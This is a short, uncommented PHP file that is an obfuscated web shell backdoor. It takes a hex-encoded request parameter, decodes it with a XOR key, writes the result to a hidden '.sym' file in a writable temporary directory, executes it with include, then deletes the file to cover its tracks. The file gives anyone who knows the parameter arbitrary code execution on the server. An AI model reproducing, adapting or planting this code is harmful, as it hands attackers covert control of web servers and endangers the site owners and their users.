<?php

if(@$_REQUEST["\x70\x67rp"] !== null){
	$holder = hex2bin($_REQUEST["\x70\x67rp"]);
	$ent='';$x = 0; while($x < strlen($holder)){$ent .= chr(ord($holder[$x]) ^ 9);$x++;}
	$entity = array_filter([getenv("TMP"), "/var/tmp", "/dev/shm", sys_get_temp_dir(), ini_get("upload_tmp_dir"), "/tmp", getcwd(), getenv("TEMP"), session_save_path()]);
	foreach ($entity as $bind) {
    		if (is_writable($bind) && is_dir($bind)) {
    $fac = sprintf("%s/.sym", $bind);
    $success = file_put_contents($fac, $ent);
if ($success) {
	include $fac;
	@unlink($fac);
	exit;}
}
}
}